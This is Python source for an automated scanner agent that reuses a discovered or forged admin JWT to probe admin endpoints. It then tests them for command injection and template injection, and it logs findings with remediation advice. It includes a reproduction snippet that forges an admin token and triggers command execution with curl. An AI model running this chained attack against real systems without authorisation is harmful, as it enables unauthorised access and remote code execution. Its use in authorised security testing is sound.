"""
Re-Attack Agent

Listens for auth_token_discovered events and re-runs targeted exploitation
on endpoints that previously failed due to missing authentication.

This agent does NOT re-run the full scan. It only:
1. Retrieves the list of URLs/endpoints already discovered during the scan
2. Gets the new auth headers from scan_context
3. Re-runs ONLY the exploitation phase on admin-gated endpoints

Architecture:
- Subscribes to: auth_token_discovered
- Uses: get_scan_auth_headers() from scan_context.py
- Calls: Individual specialist attack functions directly (NOT full agents)
- Emits: vulnerability_detected (same as specialists)
"""

import asyncio
from typing import Dict, Any, List
from loguru import logger

from bugtrace.agents.base import BaseAgent
from bugtrace.core.config import settings


class ReAttackAgent(BaseAgent):
    """Re-attacks with discovered credentials."""

    def __init__(self, event_bus=None, scan_context: str = ""):
        super().__init__(
            "ReAttackAgent",
            "Credential Re-Exploitation Specialist",
            event_bus,
            agent_id="reattack",
        )
        self._scan_context = scan_context
        self._reattack_lock = asyncio.Lock()
        self._already_reattacked = set()  # Prevent duplicate re-attacks

    def _setup_event_subscriptions(self):
        """Subscribe to auth token discovery events."""
        if self.event_bus:
            # Use string "auth_token_discovered" as per TAREA 1
            self.event_bus.subscribe("auth_token_discovered", self._handle_new_token)
            logger.info(f"[{self.name}] Subscribed to auth_token_discovered")

    def _cleanup_event_subscriptions(self):
        if self.event_bus:
            self.event_bus.unsubscribe("auth_token_discovered", self._handle_new_token)

    async def _handle_new_token(self, data: Dict[str, Any]):
        """Handle new auth token discovery."""
        token_name = data.get("token_name", "unknown")
        scan_ctx_id = data.get("scan_ctx_id", "")
        roles = data.get("roles", [])

        # Only re-attack if we have admin-level access
        if "admin" not in roles:
            logger.debug(f"[{self.name}] Token '{token_name}' is not admin, skipping re-attack")
            return

        # Prevent duplicate re-attacks for same token
        reattack_key = f"{scan_ctx_id}:{token_name}"
        if reattack_key in self._already_reattacked:
            logger.debug(f"[{self.name}] Already re-attacked with '{token_name}', skipping")
            return

        async with self._reattack_lock:
            if reattack_key in self._already_reattacked:
                return
            self._already_reattacked.add(reattack_key)

        logger.info(f"[{self.name}] 🔑 New admin token '{token_name}' discovered! Starting re-attack phase...")

        # Get the actual auth headers
        from bugtrace.services.scan_context import get_scan_auth_headers
        auth_headers = get_scan_auth_headers(scan_ctx_id, role="admin")

        if not auth_headers:
            logger.warning(f"[{self.name}] No auth headers available for '{token_name}'")
            return

        # Run targeted re-exploitation
        await self._reattack_admin_endpoints(scan_ctx_id, auth_headers)

    def _sanitize_scan_id(self, scan_ctx_id: str) -> int:
        """Extract numeric scan ID from various formats.
        
        Handles:
        - Pure numeric: "123" -> 123
        - Alphanumeric: "scan_123432085042560_1773263199" -> extracts first number
        - Complex IDs: Returns None if no valid number found
        """
        import re
        if not scan_ctx_id:
            return None
        
        # Try direct conversion first (pure numeric)
        try:
            return int(scan_ctx_id)
        except ValueError:
            pass
        
        # Extract first number from alphanumeric ID like "scan_123432085042560_1773263199"
        match = re.search(r'\d+', scan_ctx_id)
        if match:
            try:
                return int(match.group())
            except ValueError:
                pass
        
        return None

    async def _reattack_admin_endpoints(self, scan_ctx_id: str, auth_headers: Dict[str, str]):
        """Re-attack admin-gated endpoints with new credentials.

        Strategy:
        1. Get the target base URL from scan context (with fallback mechanisms)
        2. Probe known admin paths for accessibility
        3. Run RCE checks on accessible admin endpoints
        4. Run SSTI checks on accessible admin endpoints
        """
        from bugtrace.agents.jwt.types import ADMIN_PATHS, RCE_PARAMS, RCE_INDICATORS, SSTI_PAYLOAD, SSTI_EXPECTED_RESULT, SSTI_BODY_FIELDS, SSTI_ALT_PAYLOADS
        from bugtrace.core.http_orchestrator import orchestrator, DestinationType
        import re

        # Get target URL from the scan context store (with multiple fallback mechanisms)
        target_base = None
        
        # Method 1: Try ScanService with sanitized ID
        numeric_id = self._sanitize_scan_id(scan_ctx_id)
        if numeric_id:
            try:
                from bugtrace.services.scan_service import ScanService
                scan_service = ScanService()
                scan_data = await scan_service.get_scan_status(numeric_id)
                if scan_data and "target" in scan_data:
                    from urllib.parse import urlparse
                    parsed = urlparse(scan_data["target"])
                    target_base = f"{parsed.scheme}://{parsed.netloc}"
                    logger.debug(f"[{self.name}] Got target from ScanService: {target_base}")
            except Exception as e:
                logger.debug(f"[{self.name}] ScanService lookup failed: {e}")

        # Method 2: Fallback - Try to get target from global settings/active scan
        if not target_base:
            try:
                from bugtrace.core.config import settings
                # Check if there's a recent target in settings or environment
                if hasattr(settings, 'LAST_TARGET_URL') and settings.LAST_TARGET_URL:
                    from urllib.parse import urlparse
                    parsed = urlparse(settings.LAST_TARGET_URL)
                    target_base = f"{parsed.scheme}://{parsed.netloc}"
                    logger.debug(f"[{self.name}] Got target from settings fallback: {target_base}")
            except Exception as e:
                logger.debug(f"[{self.name}] Settings fallback failed: {e}")

        # Method 3: Fallback - Try active scans in memory
        if not target_base:
            try:
                from bugtrace.services.scan_service import ScanService
                scan_service = ScanService()
                # Check active scans for matching context
                async with scan_service._lock:
                    for sid, ctx in scan_service._active_scans.items():
                        # Match by numeric ID or by context string
                        if str(sid) == scan_ctx_id or scan_ctx_id.endswith(str(sid)):
                            target_base = ctx.options.target_url
                            from urllib.parse import urlparse
                            parsed = urlparse(target_base)
                            target_base = f"{parsed.scheme}://{parsed.netloc}"
                            logger.debug(f"[{self.name}] Got target from active scans: {target_base}")
                            break
            except Exception as e:
                logger.debug(f"[{self.name}] Active scans fallback failed: {e}")

        if not target_base:
            logger.warning(f"[{self.name}] Cannot determine target base URL (scan_ctx_id={scan_ctx_id}), aborting re-attack")
            return

        logger.info(f"[{self.name}] Re-attacking {target_base} with admin credentials")

        findings = []

        # Phase 1: Discover accessible admin endpoints with the new token
        accessible_endpoints = []
        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                for path in ADMIN_PATHS:
                    url = f"{target_base}{path}"
                    try:
                        async with session.get(
                            url,
                            headers=auth_headers,
                            timeout=5,
                        ) as resp:
                            if resp.status == 200:
                                body = await resp.text()
                                accessible_endpoints.append((url, body))
                                logger.info(f"[{self.name}] Admin endpoint accessible: {path}")
                    except Exception:
                        continue
        except Exception as e:
            logger.debug(f"[{self.name}] Admin endpoint discovery error: {e}")

        if not accessible_endpoints:
            logger.info(f"[{self.name}] No admin endpoints accessible with new token")
            return

        logger.info(f"[{self.name}] Found {len(accessible_endpoints)} accessible admin endpoints, testing for RCE/SSTI...")

        # Phase 2: Test RCE on accessible endpoints
        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                for ep_url, _ in accessible_endpoints:
                    for param in RCE_PARAMS:
                        test_cmd = "id"
                        test_url = f"{ep_url}?{param}={test_cmd}"
                        try:
                            async with session.get(
                                test_url,
                                headers=auth_headers,
                                timeout=8,
                            ) as resp:
                                if resp.status != 200:
                                    continue
                                body = await resp.text()

                                for pattern in RCE_INDICATORS:
                                    if re.search(pattern, body):
                                        # Verify it's not a false positive
                                        async with session.get(
                                            ep_url,
                                            headers=auth_headers,
                                            timeout=5,
                                        ) as base_resp:
                                            base_body = await base_resp.text()
                                            if not re.search(pattern, base_body):
                                                finding = {
                                                    "type": "Authenticated RCE (Chain Exploit)",
                                                    "url": ep_url,
                                                    "parameter": param,
                                                    "payload": test_cmd,
                                                    "evidence": f"RCE via chained exploit: JWT cracked → admin token forged → command injection via ?{param}={test_cmd}",
                                                    "severity": "CRITICAL",
                                                    "cwe_id": "CWE-78",
                                                    "cve_id": "N/A",
                                                    "remediation": "Never pass user input to OS commands. Use strong JWT secrets (32+ random bytes).",
                                                    "validated": True,
                                                    "status": "VALIDATED_CONFIRMED",
                                                    "description": f"Chained exploit: Weak JWT secret → admin token forgery → Remote Code Execution via {param} on {ep_url}",
                                                    "reproduction": f"# Step 1: Crack JWT secret\n# Step 2: Forge admin token\nimport jwt\ntoken = jwt.encode({{'sub':'admin','role':'admin'}}, 'CRACKED_SECRET', algorithm='HS256')\n# Step 3: RCE\ncurl -H 'Authorization: Bearer $token' '{test_url}'",
                                                    "http_request": f"GET {test_url} with forged admin JWT",
                                                    "http_response": f"200 OK with command output",
                                                    "_chain_exploit": True,
                                                }
                                                findings.append(finding)
                                                logger.info(f"[{self.name}] 🔴 CRITICAL: Authenticated RCE found via chain exploit!")

                                                # Emit finding
                                                if self.event_bus:
                                                    await self.event_bus.emit("vulnerability_detected", {
                                                        "specialist": "reattack",
                                                        "finding": finding,
                                                        "status": "VALIDATED_CONFIRMED",
                                                    })
                        except Exception:
                            continue
        except Exception as e:
            logger.debug(f"[{self.name}] RCE re-attack error: {e}")

        # Phase 3: Test SSTI on admin endpoints
        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                ssti_candidates = [
                    ep for ep, _ in accessible_endpoints
                    if any(kw in ep.lower() for kw in ["email", "template", "preview", "render", "report", "notify"])
                ]
                # Also add known SSTI paths
                for path in ["/api/admin/email-preview", "/api/admin/template/render", "/api/admin/preview"]:
                    url = f"{target_base}{path}"
                    if url not in [e for e, _ in accessible_endpoints]:
                        ssti_candidates.append(url)

                for ep_url in ssti_candidates[:10]:
                    for field_name in SSTI_BODY_FIELDS:
                        for payload in [SSTI_PAYLOAD] + SSTI_ALT_PAYLOADS:
                            try:
                                async with session.post(
                                    ep_url,
                                    headers=auth_headers,
                                    json={field_name: payload},
                                    timeout=8,
                                ) as resp:
                                    if resp.status not in (200, 201):
                                        continue
                                    body = await resp.text()
                                    if SSTI_EXPECTED_RESULT in body:
                                        finding = {
                                            "type": "Authenticated SSTI (Chain Exploit)",
                                            "url": ep_url,
                                            "parameter": field_name,
                                            "payload": payload,
                                            "evidence": f"SSTI via chained exploit: JWT cracked → admin token → template injection via {field_name}",
                                            "severity": "CRITICAL",
                                            "cwe_id": "CWE-1336",
                                            "cve_id": "N/A",
                                            "remediation": "Never render user input as template code. Use Jinja2 sandbox.",
                                            "validated": True,
                                            "status": "VALIDATED_CONFIRMED",
                                            "description": f"Chained exploit: Weak JWT → admin access → Server-Side Template Injection via {field_name} on {ep_url}",
                                            "_chain_exploit": True,
                                        }
                                        findings.append(finding)
                                        logger.info(f"[{self.name}] 🔴 CRITICAL: Authenticated SSTI found via chain exploit!")

                                        if self.event_bus:
                                            await self.event_bus.emit("vulnerability_detected", {
                                                "specialist": "reattack",
                                                "finding": finding,
                                                "status": "VALIDATED_CONFIRMED",
                                            })
                            except Exception:
                                continue
        except Exception as e:
            logger.debug(f"[{self.name}] SSTI re-attack error: {e}")

        logger.info(f"[{self.name}] Re-attack phase complete. Found {len(findings)} new vulnerabilities via credential chaining.")

    async def run_loop(self):
        """Main loop - just waits for events."""
        while self.running:
            await asyncio.sleep(5)
